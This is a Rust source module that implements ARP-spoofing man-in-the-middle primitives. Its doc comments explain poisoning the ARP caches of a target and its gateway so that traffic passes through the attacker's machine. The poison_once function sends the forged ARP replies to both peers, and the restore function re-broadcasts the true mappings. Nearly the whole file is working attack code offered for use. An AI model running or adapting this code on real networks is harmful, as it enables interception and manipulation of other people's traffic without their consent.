//! ARP-spoof MITM.
//!
//! To sit between a target and the gateway we poison both ARP caches:
//! - tell the **target** that the gateway's IP is at *our* MAC, and
//! - tell the **gateway** that the target's IP is at *our* MAC.
//!
//! Caches expire and hosts re-ARP, so a real session must re-send these on an
//! interval (~1–2s). That continuous loop, plus the kernel sysctl setup
//! (`ip_forward=0`, `send_redirects=0`) plus userspace forwarding
//! ([`super::forward`]), is the engine work that comes next. The primitives
//! below (single poison + restore) are implemented and reusable.

use super::scan::build_arp;
use super::NetCtx;
use anyhow::{anyhow, Result};
use pnet::datalink::{self, Channel, Config};
use pnet::packet::arp::ArpOperations;
use pnet::util::MacAddr;
use std::net::Ipv4Addr;

/// One endpoint we're lying to / about.
#[derive(Debug, Clone, Copy)]
pub struct Peer {
    pub ip: Ipv4Addr,
    pub mac: MacAddr,
}

fn sender(ctx: &NetCtx) -> Result<Box<dyn datalink::DataLinkSender>> {
    match datalink::channel(&ctx.iface, Config::default())? {
        Channel::Ethernet(tx, _rx) => Ok(tx),
        _ => Err(anyhow!("unsupported datalink channel type")),
    }
}

/// Send one round of poisoning: target←gateway and gateway←target, both
/// pointing at us. Call repeatedly on an interval to hold the MITM.
pub fn poison_once(ctx: &NetCtx, target: Peer, gateway: Peer) -> Result<()> {
    let mut tx = sender(ctx)?;
    // To the target: "gateway_ip is at our MAC".
    let to_target = build_arp(
        ArpOperations::Reply,
        ctx.our_mac,
        gateway.ip,
        target.mac,
        target.mac,
        target.ip,
    );
    // To the gateway: "target_ip is at our MAC".
    let to_gateway = build_arp(
        ArpOperations::Reply,
        ctx.our_mac,
        target.ip,
        gateway.mac,
        gateway.mac,
        gateway.ip,
    );
    send(&mut tx, &to_target)?;
    send(&mut tx, &to_gateway)?;
    Ok(())
}

/// Undo the poisoning by broadcasting the correct mappings a few times so both
/// peers relearn the truth. Always call this when releasing a device.
pub fn restore(ctx: &NetCtx, target: Peer, gateway: Peer) -> Result<()> {
    let mut tx = sender(ctx)?;
    // target learns the real gateway MAC; gateway learns the real target MAC.
    let fix_target = build_arp(
        ArpOperations::Reply,
        gateway.mac,
        gateway.ip,
        target.mac,
        target.mac,
        target.ip,
    );
    let fix_gateway = build_arp(
        ArpOperations::Reply,
        target.mac,
        target.ip,
        gateway.mac,
        gateway.mac,
        gateway.ip,
    );
    for _ in 0..3 {
        send(&mut tx, &fix_target)?;
        send(&mut tx, &fix_gateway)?;
    }
    Ok(())
}

fn send(tx: &mut Box<dyn datalink::DataLinkSender>, pkt: &[u8]) -> Result<()> {
    match tx.send_to(pkt, None) {
        Some(Ok(())) => Ok(()),
        Some(Err(e)) => Err(anyhow!("send failed: {e}")),
        None => Err(anyhow!("send failed: no buffer")),
    }
}
